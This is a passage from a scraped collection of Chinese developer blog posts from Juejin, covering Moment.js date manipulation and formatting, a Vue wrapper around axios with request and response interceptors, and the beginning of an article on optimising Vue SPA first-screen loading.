class=\"hljs-string\">'d'</span>);\n</code></pre><table>\n<thead>\n<tr>\n<th>时间单位</th>\n<th>缩写</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>years</td>\n<td>y</td>\n</tr>\n<tr>\n<td>quarters</td>\n<td>Q</td>\n</tr>\n<tr>\n<td>months</td>\n<td>M</td>\n</tr>\n<tr>\n<td>weeks</td>\n<td>W</td>\n</tr>\n<tr>\n<td>days</td>\n<td>d</td>\n</tr>\n<tr>\n<td>hours</td>\n<td>h</td>\n</tr>\n<tr>\n<td>minutes</td>\n<td>m</td>\n</tr>\n<tr>\n<td>seconds</td>\n<td>s</td>\n</tr>\n<tr>\n<td>milliseconds</td>\n<td>ms</td>\n</tr>\n</tbody>\n</table>\n<p>如果想要同时增加不同时间单位，可以以对象的形式传入：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().add(7, <span class=\"hljs-string\">'days'</span>).add(1, <span class=\"hljs-string\">'months'</span>);\nmoment().add({days:7,months:1});\n</code></pre><p>需要注意的是，如果原始日期的天数比新增后的日期的月份的总天数还要多，就变为该月的最后一天：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">// 01-31\nmoment([2010, 0, 31]);                  \n\n// 02-28 \nmoment([2010, 0, 31]).add(1, <span class=\"hljs-string\">'months'</span>); \n//2月份没有31号，自动变为最后一天，即28号\n</code></pre><h2 class=\"heading\" data-id=\"heading-15\">subtract减法</h2>\n<p>subtract函数的用法和add相似，不同的是把时间往前推。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().subtract(Number, String);\nmoment().subtract(Duration);\nmoment().subtract(Object);\n</code></pre><h2 class=\"heading\" data-id=\"heading-16\">startOf开始时间</h2>\n<p>startOf函数将Moment对象的时间设置为传入单位的开始时间。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment()                    //当前时间2017-12-09\nmoment().startOf(<span class=\"hljs-string\">'year'</span>);   //今年年初2017-01-01\nmoment().startOf(<span class=\"hljs-string\">'month'</span>);  //这个月开始2017-12-01\nmoment().startOf(<span class=\"hljs-string\">'quarter'</span>);//这个季度开始2017-10-01\nmoment().startOf(<span class=\"hljs-string\">'week'</span>);   //这周开始2017-12-03（周日为开始）\nmoment().startOf(<span class=\"hljs-string\">'isoWeek'</span>);//这周开始2017-12-04（根据ISO 8601，周一为开始）\nmoment().startOf(<span class=\"hljs-string\">'day'</span>);    //今天的开始时间2017-12-09 00:00:00:000\nmoment().startOf(<span class=\"hljs-string\">'hour'</span>);   //今天当前小时开始2017-12-09 13:00:00:000\nmoment().startOf(<span class=\"hljs-string\">'minute'</span>); //今天当前分钟开始2017-12-09 13:14:00:000\nmoment().startOf(<span class=\"hljs-string\">'second'</span>); //今天当前秒钟开始2017-12-09 13:14:15:000\n</code></pre><h2 class=\"heading\" data-id=\"heading-17\">endOf结束时间</h2>\n<p>endOf函数将Moment对象的时间设置为传入单位的结束时间。使用方式和startOf相似。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().endOf(String);\n</code></pre><h1 class=\"heading\" data-id=\"heading-18\">显示</h1>\n<p>当我们解析和操作完Moment对象后，我们就需要对最后的结果进行展示。</p>\n<h2 class=\"heading\" data-id=\"heading-19\">format格式化</h2>\n<p>format函数接收token字符串，并且将token替换成对应的值。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().format();                                // <span class=\"hljs-string\">\"2014-09-08T08:02:17-05:00\"</span> (ISO 8601)\nmoment().format(<span class=\"hljs-string\">\"dddd, MMMM Do YYYY, h:mm:ss a\"</span>); // <span class=\"hljs-string\">\"Sunday, February 14th 2010, 3:25:50 pm\"</span>\nmoment().format(<span class=\"hljs-string\">\"ddd, hA\"</span>);                       // <span class=\"hljs-string\">\"Sun, 3PM\"</span>\n</code></pre><p>对应的关系如下表：</p>\n<table>\n<thead>\n<tr>\n<th>-</th>\n<th>Token</th>\n<th>输入</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>月</td>\n<td>M</td>\n<td>1 2 .. 11 12</td>\n</tr>\n<tr>\n<td></td>\n<td>Mo</td>\n<td>1st 2nd ... 11th 12th</td>\n</tr>\n<tr>\n<td></td>\n<td>MM</td>\n<td>01 02 ... 11 12</td>\n</tr>\n<tr>\n<td></td>\n<td>MMM</td>\n<td>Jan Feb ... Nov Dec</td>\n</tr>\n<tr>\n<td></td>\n<td>MMMM</td>\n<td>January February ... November December</td>\n</tr>\n<tr>\n<td>季度</td>\n<td>Q</td>\n<td>1 2 3 4</td>\n</tr>\n<tr>\n<td>月份中的天</td>\n<td>D</td>\n<td>1 2 ... 30 31</td>\n</tr>\n<tr>\n<td></td>\n<td>Do</td>\n<td>1st 2nd ... 30th 31st</td>\n</tr>\n<tr>\n<td></td>\n<td>DD</td>\n<td>01 02 ... 30 31</td>\n</tr>\n<tr>\n<td>年份中的天</td>\n<td>DDD</td>\n<td>1 2 ... 365 366</td>\n</tr>\n<tr>\n<td></td>\n<td>DDDo</td>\n<td>st 2nd ... 365th 366th</td>\n</tr>\n<tr>\n<td></td>\n<td>DDDD</td>\n<td>001 002 ... 365 366</td>\n</tr>\n<tr>\n<td>星期中的天</td>\n<td>d</td>\n<td>0 1 ... 5 6</td>\n</tr>\n<tr>\n<td></td>\n<td>do</td>\n<td>0th 1st ... 5th 6th</td>\n</tr>\n<tr>\n<td></td>\n<td>dd</td>\n<td>Su Mo ... Fr Sa</td>\n</tr>\n<tr>\n<td></td>\n<td>ddd</td>\n<td>Sun Mon ... Fri Sat</td>\n</tr>\n<tr>\n<td></td>\n<td>dddd</td>\n<td>Sunday Monday ... Friday Saturday</td>\n</tr>\n<tr>\n<td>年中的星期</td>\n<td>w</td>\n<td>1 2 ... 52 53</td>\n</tr>\n<tr>\n<td></td>\n<td>wo</td>\n<td>1st 2nd ... 52nd 53rd</td>\n</tr>\n<tr>\n<td></td>\n<td>ww</td>\n<td>01 02 ... 52 53</td>\n</tr>\n<tr>\n<td>年</td>\n<td>YY</td>\n<td>70 71 ... 29 30</td>\n</tr>\n<tr>\n<td></td>\n<td>YYYY</td>\n<td>1970 1971 ... 2029 2030</td>\n</tr>\n<tr>\n<td>AM/PM</td>\n<td>A</td>\n<td>AM PM</td>\n</tr>\n<tr>\n<td></td>\n<td>a</td>\n<td>am pm</td>\n</tr>\n<tr>\n<td>小时</td>\n<td>H</td>\n<td>0 1 ... 22 23</td>\n</tr>\n<tr>\n<td></td>\n<td>HH</td>\n<td>00 01 ... 22 23</td>\n</tr>\n<tr>\n<td></td>\n<td>h</td>\n<td>1 2 ... 11 12</td>\n</tr>\n<tr>\n<td></td>\n<td>hh</td>\n<td>01 02 ... 11 12</td>\n</tr>\n<tr>\n<td>分钟</td>\n<td>m</td>\n<td>0 1 ... 58 59</td>\n</tr>\n<tr>\n<td></td>\n<td>mm</td>\n<td>00 01 ... 58 59</td>\n</tr>\n<tr>\n<td>秒</td>\n<td>s</td>\n<td>0 1 ... 58 59</td>\n</tr>\n<tr>\n<td></td>\n<td>ss</td>\n<td>00 01 ... 58 59</td>\n</tr>\n<tr>\n<td>毫秒</td>\n<td>ms</td>\n<td>000 001 ... 998 999</td>\n</tr>\n</tbody>\n</table>\n<h2 class=\"heading\" data-id=\"heading-20\">diff时差</h2>\n<p>语法</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().diff(Moment|String|Number|Date|Array);\nmoment().diff(Moment|String|Number|Date|Array, String);\nmoment().diff(Moment|String|Number|Date|Array, String, Boolean);\n</code></pre><p>diff函数可以帮我们获取到两个Moment对象的时间差，默认的单位是毫秒。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">var a = moment([2017, 12, 29]);\nvar b = moment([2017, 12, 28]);\na.diff(b) // 86400000\n</code></pre><p>除了得到毫秒为单位，diff函数还支持获取其他的时间单位，将其作为第二个参数传入：</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">var a = moment([2007, 0, 29]);\nvar b = moment([2007, 0, 28]);\na.diff(b, <span class=\"hljs-string\">'days'</span>) // 1\n</code></pre><p>支持的测量单位有years、months、weeks、days、hours、minutes、seconds和milliseconds。默认返回的数值会向下取舍，去掉小数。假如想要精确一点，得到小数类型的数值，第三个参数传入一个true。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">var a = moment([2008, 6]);\nvar b = moment([2007, 0]);\na.diff(b, <span class=\"hljs-string\">'years'</span>);       // 1\na.diff(b, <span class=\"hljs-string\">'years'</span>, <span class=\"hljs-literal\">true</span>); // 1.5\n</code></pre><h2 class=\"heading\" data-id=\"heading-21\">daysInMonth获取当前月份的天数</h2>\n<p>daysInMonth获取当前月的总天数</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment(<span class=\"hljs-string\">\"2012-02\"</span>, <span class=\"hljs-string\">\"YYYY-MM\"</span>).daysInMonth() // 29\nmoment(<span class=\"hljs-string\">\"2012-01\"</span>, <span class=\"hljs-string\">\"YYYY-MM\"</span>).daysInMonth() // 31\n</code></pre><h2 class=\"heading\" data-id=\"heading-22\">toDate转为Date对象</h2>\n<p>将Moment对象转为js原生的Date对象</p>\n<h2 class=\"heading\" data-id=\"heading-23\">toArray转为数组</h2>\n<p>返回时间数组，和构造Moment对象时传入的数组代表的含义相同。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().toArray(); // [2017, 12, 9, 13, 40, 16, 154];\n</code></pre><h2 class=\"heading\" data-id=\"heading-24\">toObject</h2>\n<p>将Moment对象转为包含年月日时分秒毫秒的对象。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().toObject()  // {\n                     //     years: 2017\n                     //     months: 12\n                     //     date: 9,\n                     //     hours: 13,\n                     //     minutes: 40,\n                     //     seconds: 18,\n                     //     milliseconds: 600\n                     // }\n</code></pre><h1 class=\"heading\" data-id=\"heading-25\">查询</h1>\n<p>查询操作主要用来判断Moment是否满足某些条件。</p>\n<h2 class=\"heading\" data-id=\"heading-26\">isBefore是否之前</h2>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().isBefore(Moment|String|Number|Date|Array);\nmoment().isBefore(Moment|String|Number|Date|Array, String);\n</code></pre><p>isBefore判断一个moment对象是否在某个时间点之前。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment(<span class=\"hljs-string\">'2010-10-20'</span>).isBefore(<span class=\"hljs-string\">'2010-10-21'</span>); // <span class=\"hljs-literal\">true</span>\n</code></pre><p>默认的比较单位是毫秒，但是假如我们想要限制到其他的时间单位，我们可以将其作为第二个参数传入。接受的单位和startOf支持的单位一样。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">console.log(moment(<span class=\"hljs-string\">'2017-11-03'</span>).isBefore(<span class=\"hljs-string\">'2017-11-06'</span>))\nconsole.log(moment(<span class=\"hljs-string\">'2017-11-03'</span>).isBefore(<span class=\"hljs-string\">'2017-11-06'</span>, <span class=\"hljs-string\">'year'</span>))\nconsole.log(moment(<span class=\"hljs-string\">'2017-11-03'</span>).isBefore(<span class=\"hljs-string\">'2018-11-06'</span>, <span class=\"hljs-string\">'year'</span>))\n</code></pre><h2 class=\"heading\" data-id=\"heading-27\">isSame是否相同</h2>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().isSame(Moment|String|Number|Date|Array);\nmoment().isSame(Moment|String|Number|Date|Array, String);\n</code></pre><p>isSame判断一个moment对象是否和另一个moment对象相同。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment(<span class=\"hljs-string\">'2010-10-20'</span>).isSame(<span class=\"hljs-string\">'2010-10-20'</span>); // <span class=\"hljs-literal\">true</span>\nmoment(<span class=\"hljs-string\">'2010-10-20'</span>).isSame(<span class=\"hljs-string\">'2010-10-21'</span>); // <span class=\"hljs-literal\">false</span>\n</code></pre><p>同样的，我们如果要将比较的单位改为其他的，也可以作为第二个参数传入。接受的单位和startOf支持的单位一样。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment(<span class=\"hljs-string\">'2010-10-20'</span>).isSame(<span class=\"hljs-string\">'2009-12-31'</span>, <span class=\"hljs-string\">'year'</span>);  // <span class=\"hljs-literal\">false</span>\nmoment(<span class=\"hljs-string\">'2010-10-20'</span>).isSame(<span class=\"hljs-string\">'2010-01-01'</span>, <span class=\"hljs-string\">'year'</span>);  // <span class=\"hljs-literal\">true</span>\n</code></pre><p>当传入第二个参数时，它会匹配所有相同或者更大的单位。比如传入了月份，将会比较年和月，传入了日期，将会比较年月日</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">// <span class=\"hljs-literal\">false</span>, 不同的年\nmoment(<span class=\"hljs-string\">'2010-01-01'</span>).isSame(<span class=\"hljs-string\">'2011-01-01'</span>, <span class=\"hljs-string\">'month'</span>);\n\n// <span class=\"hljs-literal\">false</span>, 不同的月\nmoment(<span class=\"hljs-string\">'2010-01-01'</span>).isSame(<span class=\"hljs-string\">'2010-02-01'</span>, <span class=\"hljs-string\">'day'</span>);\n</code></pre><h2 class=\"heading\" data-id=\"heading-28\">isAfter是否之后</h2>\n<p>isBefore判断一个moment对象是否在某个时间点之后。接受的单位和startOf支持的单位一样。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment(<span class=\"hljs-string\">'2010-10-20'</span>).isAfter(<span class=\"hljs-string\">'2010-10-19'</span>); // <span class=\"hljs-literal\">true</span>\n</code></pre><h2 class=\"heading\" data-id=\"heading-29\">isBetween是否之间</h2>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment().isBetween(moment-like, moment-like);\nmoment().isBetween(moment-like, moment-like, String);\n//moment-like 表示 Moment|String|Number|Date|Array\n</code></pre><p>判断一个moment对象是否在两个其他时间点之间。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment(<span class=\"hljs-string\">'2017-10-20'</span>).isBetween(<span class=\"hljs-string\">'2017-10-19'</span>, <span class=\"hljs-string\">'2017-10-25'</span>); // <span class=\"hljs-literal\">true</span>\n</code></pre><p>传入第二个参数作为限制的单位。接受的单位和startOf支持的单位一样。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment(<span class=\"hljs-string\">'2010-10-20'</span>).isBetween(<span class=\"hljs-string\">'2010-01-01'</span>, <span class=\"hljs-string\">'2012-01-01'</span>, <span class=\"hljs-string\">'year'</span>); // <span class=\"hljs-literal\">false</span>\nmoment(<span class=\"hljs-string\">'2010-10-20'</span>).isBetween(<span class=\"hljs-string\">'2009-12-31'</span>, <span class=\"hljs-string\">'2012-01-01'</span>, <span class=\"hljs-string\">'year'</span>); // <span class=\"hljs-literal\">true</span>\n</code></pre><h2 class=\"heading\" data-id=\"heading-30\">isLeapYear是否闰年</h2>\n<p>是闰年就返回true，不是就返回false。</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment([2000]).isLeapYear() // <span class=\"hljs-literal\">true</span>\nmoment([2001]).isLeapYear() // <span class=\"hljs-literal\">false</span>\nmoment([2100]).isLeapYear() // <span class=\"hljs-literal\">false</span>\n</code></pre><h2 class=\"heading\" data-id=\"heading-31\">isMoment 是否Moment对象</h2>\n<p>判断是否Moment对象</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment.isMoment() // <span class=\"hljs-literal\">false</span>\nmoment.isMoment(new Date()) // <span class=\"hljs-literal\">false</span>\nmoment.isMoment(moment()) // <span class=\"hljs-literal\">true</span>\n</code></pre><h2 class=\"heading\" data-id=\"heading-32\">isDate是否Date对象</h2>\n<p>判断是否Date对象</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">moment.isDate(); // <span class=\"hljs-literal\">false</span>\nmoment.isDate(new Date()); // <span class=\"hljs-literal\">true</span>\nmoment.isDate(moment()); // <span class=\"hljs-literal\">false</span>\n</code></pre><p>如果觉得写得还不错，请关注我的<a style=\"color:#f63;text-decoration:none;\" href=\"https://link.juejin.im?target=%2F%2Fjuejin.im%2Fuser%2F580038cebf22ec0064bd0b2d\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">掘金主页</a>。更多文章请访问<a style=\"color:#f63;text-decoration:none;\" href=\"https://link.juejin.im?target=http%3A%2F%2Fxieyufei.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">我的博客地址</a></p>\n</div>"},{"title":"vue项目中对axios的二次封装","avatar":"https://user-gold-cdn.xitu.io/2017/11/23/15fe839d4cdb8d78?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"Justnull","create_time":"2017 年 12 月 08 日","tags":["Vue.js","axios","JavaScript"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h3 class=\"heading\" data-id=\"heading-0\">近来在使用vue重构公司m站时，使用了axios来进行数据的请求，由于项目的需要，对axios进行了二次封装，<a target=\"_blank\" title=\"点击进入axios\" href=\"https://link.juejin.im?target=http%3A%2F%2Fgithub.com%2Faxios%2Faxios\" rel=\"nofollow noopener noreferrer\">点击进入axios</a></h3>\n<pre><code class=\"hljs javascript\" lang=\"javascript\"><span class=\"hljs-comment\">//引入axios</span>\n<span class=\"hljs-keyword\">import</span> axios <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'axios'</span>\n\n<span class=\"hljs-keyword\">let</span> cancel ,promiseArr = {}\n<span class=\"hljs-keyword\">const</span> CancelToken = axios.CancelToken;\n<span class=\"hljs-comment\">//请求拦截器</span>\naxios.interceptors.request.use(<span class=\"hljs-function\"><span class=\"hljs-params\">config</span> =&gt;</span> {\n    <span class=\"hljs-comment\">//发起请求时，取消掉当前正在进行的相同请求</span>\n    <span class=\"hljs-keyword\">if</span> (promiseArr[config.url]) {\n        promiseArr[config.url](<span class=\"hljs-string\">'操作取消'</span>)\n        promiseArr[config.url] = cancel\n    } <span class=\"hljs-keyword\">else</span> {\n        promiseArr[config.url] = cancel\n    }\n      <span class=\"hljs-keyword\">return</span> config\n}, error =&gt; {\n    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">Promise</span>.reject(error)\n})\n\n<span class=\"hljs-comment\">//响应拦截器即异常处理</span>\naxios.interceptors.response.use(<span class=\"hljs-function\"><span class=\"hljs-params\">response</span> =&gt;</span> {\n    <span class=\"hljs-keyword\">return</span> response\n}, error =&gt; {\n    <span class=\"hljs-keyword\">if</span> (error &amp;&amp; err.response) {\n      <span class=\"hljs-keyword\">switch</span> (err.response.status) {\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">400</span>:\n          err.message = <span class=\"hljs-string\">'错误请求'</span>\n          <span class=\"hljs-keyword\">break</span>;\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">401</span>:\n          err.message = <span class=\"hljs-string\">'未授权，请重新登录'</span>\n          <span class=\"hljs-keyword\">break</span>;\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">403</span>:\n          err.message = <span class=\"hljs-string\">'拒绝访问'</span>\n          <span class=\"hljs-keyword\">break</span>;\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">404</span>:\n          err.message = <span class=\"hljs-string\">'请求错误,未找到该资源'</span>\n          <span class=\"hljs-keyword\">break</span>;\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">405</span>:\n          err.message = <span class=\"hljs-string\">'请求方法未允许'</span>\n          <span class=\"hljs-keyword\">break</span>;\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">408</span>:\n          err.message = <span class=\"hljs-string\">'请求超时'</span>\n          <span class=\"hljs-keyword\">break</span>;\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">500</span>:\n          err.message = <span class=\"hljs-string\">'服务器端出错'</span>\n          <span class=\"hljs-keyword\">break</span>;\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">501</span>:\n          err.message = <span class=\"hljs-string\">'网络未实现'</span>\n          <span class=\"hljs-keyword\">break</span>;\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">502</span>:\n          err.message = <span class=\"hljs-string\">'网络错误'</span>\n          <span class=\"hljs-keyword\">break</span>;\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">503</span>:\n          err.message = <span class=\"hljs-string\">'服务不可用'</span>\n          <span class=\"hljs-keyword\">break</span>;\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">504</span>:\n          err.message = <span class=\"hljs-string\">'网络超时'</span>\n          <span class=\"hljs-keyword\">break</span>;\n        <span class=\"hljs-keyword\">case</span> <span class=\"hljs-number\">505</span>:\n          err.message = <span class=\"hljs-string\">'http版本不支持该请求'</span>\n          <span class=\"hljs-keyword\">break</span>;\n        <span class=\"hljs-keyword\">default</span>:\n          err.message = <span class=\"hljs-string\">`连接错误<span class=\"hljs-subst\">${err.response.status}</span>`</span>\n      }\n    } <span class=\"hljs-keyword\">else</span> {\n      err.message = <span class=\"hljs-string\">\"连接到服务器失败\"</span>\n    }\n    message.error(err.message)\n  \t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">Promise</span>.resolve(error.response)\n})\n\naxios.defaults.baseURL = <span class=\"hljs-string\">'/api'</span>\n<span class=\"hljs-comment\">//设置默认请求头</span>\naxios.defaults.headers = {\n    <span class=\"hljs-string\">'X-Requested-With'</span>: <span class=\"hljs-string\">'XMLHttpRequest'</span>\n}\naxios.defaults.timeout = <span class=\"hljs-number\">10000</span>\n\n<span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> {\n  <span class=\"hljs-comment\">//get请求</span>\n    get (url,param) {\n      <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve,reject</span>) =&gt;</span> {\n        axios({\n          <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'get'</span>,\n          url,\n          <span class=\"hljs-attr\">params</span>: param,\n          <span class=\"hljs-attr\">cancelToken</span>: <span class=\"hljs-keyword\">new</span> CancelToken(<span class=\"hljs-function\"><span class=\"hljs-params\">c</span> =&gt;</span> {\n            cancel = c\n          })\n        }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">res</span> =&gt;</span> {\n          resolve(res)\n        })\n      })\n    },\n  <span class=\"hljs-comment\">//post请求</span>\n    post (url,param) {\n      <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve,reject</span>) =&gt;</span> {\n        axios({\n          <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'post'</span>,\n          url,\n          <span class=\"hljs-attr\">data</span>: param,\n          <span class=\"hljs-attr\">cancelToken</span>: <span class=\"hljs-keyword\">new</span> CancelToken(<span class=\"hljs-function\"><span class=\"hljs-params\">c</span> =&gt;</span> {\n            cancel = c\n          })\n        }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">res</span> =&gt;</span> {\n          resolve(res)\n        })\n      })\n     }\n  }\n</code></pre><h1 class=\"heading\" data-id=\"heading-1\">说明</h1>\n<ol>\n<li>为防止发起请求时，当前正在进行的相同请求，在请求拦截器中加入了hash判断，将相同请求url拦截</li>\n<li>将axios中get，post公共配置抽离出来<pre><code class=\"hljs bash\" lang=\"bash\">axios.defaults.baseURL = <span class=\"hljs-string\">'/api'</span>\n//设置默认请求头\naxios.defaults.headers = {\n    <span class=\"hljs-string\">'X-Requested-With'</span>: <span class=\"hljs-string\">'XMLHttpRequest'</span>\n}\naxios.defaults.timeout = 10000\n</code></pre></li>\n<li>get，post请求的封装\n可能你会问，这里的axios返回的就是promise对象，为什么还要再次对get,post封装一次promise.因为我这边的话，在开发中使用async await会出现数据请求失败的情况，报的错就是返回的不是promise对象。(ps：可async await返回的就是promise呀,这个问题后续再搞一下)就直接return了一个promise对象，以避免上面的错误。下面是请求接口的一个例子</li>\n</ol>\n<pre><code class=\"hljs bash\" lang=\"bash\">import req from <span class=\"hljs-string\">'../api/requestType'</span>\n/**\n * 拼团详情\n */\n<span class=\"hljs-built_in\">export</span> const groupDetail = param =&gt; {\n    <span class=\"hljs-built_in\">return</span> req.get(<span class=\"hljs-string\">'/RestHome/GroupDetail'</span>,param)\n}\n</code></pre><p>下面是数据的获取</p>\n<pre><code class=\"hljs bash\" lang=\"bash\">async <span class=\"hljs-function\"><span class=\"hljs-title\">getData</span></span>() {\n    const params = {\n        TopCataID: 0,\n        pageNumber: this.pageNumber,\n        pageSize: this.pageSize\n    }\n    const res = await groupList(params)\n},\n</code></pre><ol start=\"4\">\n<li>在相应拦截器中对请求常见的错误进行了全局异常处理</li>\n</ol>\n<pre><code class=\"hljs bash\" lang=\"bash\">axios.interceptors.response.use(response =&gt; {...\n</code></pre><p>到这里我们就简单的封装了一下适合自己项目的axios</p>\n</div>"},{"title":"Vue SPA 首屏加载优化实践","avatar":"https://user-gold-cdn.xitu.io/2017/11/30/1600bdaca3c2553b?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"Cocokai","create_time":"2017 年 12 月 08 日","tags":["Vue.js","Nginx"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h2 class=\"heading\" data-id=\"heading-0\">写在前面</h2>\n<p>本文记录笔者在Vue SPA项目首屏加载优化过程中遇到的一些坑及优化方案！</p>\n<p>我们以 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fvue-cli\" rel=\"nofollow noopener noreferrer\">vue-cli</a> 工具为例，使用 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fvue-router\" rel=\"nofollow noopener noreferrer\">vue-router</a> 搭建SPA应用，UI框架选用 <a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Felement.eleme.io%2F\" rel=\"nofollow noopener noreferrer\">element-ui</a> ， ajax方案选用 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Faxios%2Faxios\" rel=\"nofollow noopener noreferrer\">axios</a>, 并引入 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Faxios%2Faxios\" rel=\"nofollow noopener noreferrer\">vuex</a> ，使用 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fvuejs%2Fvuex-router-sync\" rel=\"nofollow noopener noreferrer\">vuex-router-sync</a> 将 <code>router</code> 同步到 <code>store</code> ，服务器使用本地Nginx服务。</p>\n<h2 class=\"heading\" data-id=\"heading-1\">构建项目</h2>\n<pre><code class=\"hljs bash\" lang=\"bash\">vue-init webpack vue-spa-starter-kit\n<span class=\"hljs-built_in\">cd</span> vue-spa-starter-kit\nnpm install\nnpm install vuex element-ui axios -S\nnpm run dev\n</code></pre><p>vue-cli会自动打开浏览器，可以看到效果。我们在入口文件中引入<code>vue-router</code>、<code>element-ui</code>、<code>axios</code></p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-comment\">// src/main.js</span>\n<span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">'babel-polyfill'</span>\n<span class=\"hljs-keyword\">import</span> Vue <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'vue'</span>\n<span class=\"hljs-keyword\">import</span> App <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'./App'</span>\n<span class=\"hljs-keyword\">import</span> axios <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'axios'</span>\n<span class=\"hljs-keyword\">import</span> store <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'./store'</span>\n<span class=\"hljs-keyword\">import</span> router <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'./router'</span>\n<span class=\"hljs-keyword\">import</span> {sync} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'vuex-router-sync'</span>\n<span class=\"hljs-keyword\">import</span> ElementUI <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'element-ui'</span>\n<span class=\"hljs-keyword\">import</span> <span class=\"hljs-string\">'element-ui/lib/theme-chalk/index.css'</span>\n\nVue.config.productionTip = <span class=\"hljs-literal\">false</span>\n\nVue.use(ElementUI)\nVue.prototype.$http = axios\n\nsync(store, router)\n\n<span class=\"hljs-comment\">/* eslint-disable no-new */</span>\n<span class=\"hljs-keyword\">new</span> Vue({\n  <span class=\"hljs-attr\">el</span>: <span class=\"hljs-string\">'#app'</span>,\n  store,\n  router,\n  <span class=\"hljs-attr\">template</span>: <span class=\"hljs-string\">'&lt;App/&gt;'</span>,\n  <span class=\"hljs-attr\">components</span>: { App }\n})\n</code></pre><p>接下来我们不做任何修改，使用默认的配置进行打包，Nginx采用默认配置，部署到Nginx，启动Nginx服务，查看效果：</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/7/160309a3eed1073e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"194\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;194&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>可以看出，在没有开发任何页面及功能的情况下，<code>vendor.js</code> 有788kb。如果我们再依赖一些其他的库，比如 <code>echarts</code> 等，<code>vendor.js</code> 能到 1M 以上。</p>\n<h2 class=\"heading\" data-id=\"heading-2\">使用CDN资源</h2>\n<p>我们要将 <code>vue</code>、 <code>vue-router</code>、 <code>vuex</code>、<code>element-ui</code> 从 <code>vendor.js</code> 